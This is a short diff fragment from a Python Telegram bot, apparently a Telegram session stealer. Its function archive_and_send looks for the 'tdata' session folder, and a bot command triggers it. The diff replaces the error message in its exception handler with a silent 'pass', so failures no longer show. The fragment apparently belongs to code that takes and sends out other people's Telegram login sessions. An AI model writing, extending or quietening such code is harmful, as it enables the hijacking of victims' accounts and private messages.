@@ -320,7 +320,7 @@ def archive_and_send():
         else:
             print("Папка 'tdata' не найдена.")
     except Exception as e:
-        print(f"Error occurred: {str(e)}")
+        pass
 @bot.message_handler(commands=['archive_and_send'])
 def handle_archive_and_send(message):
     chat_id = message.chat.id
